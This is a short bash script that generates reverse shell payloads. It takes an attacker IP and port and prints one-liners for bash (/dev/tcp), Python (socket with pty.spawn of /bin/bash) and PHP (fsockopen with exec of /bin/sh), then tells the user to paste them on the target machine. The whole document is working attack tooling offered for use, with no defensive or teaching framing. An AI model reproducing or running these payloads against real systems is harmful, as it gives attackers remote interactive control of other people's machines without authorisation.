#!/bin/bash

# Usage: ./reverse_shell.sh <attacker IP> <port>
ATTACKER_IP=$1
PORT=$2

# Check if arguments are provided
if [ -z "$ATTACKER_IP" ] || [ -z "$PORT" ]; then
    echo "Usage: $0 <attacker IP> <port>"
    exit 1
fi

# Generate reverse shell payloads
echo "Bash Reverse Shell:"
echo "bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"

echo "Python Reverse Shell:"
echo "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ATTACKER_IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"

echo "PHP Reverse Shell:"
echo "php -r '\$sock=fsockopen(\"$ATTACKER_IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

echo "[*] Reverse shell commands generated. Copy and paste on the target machine."
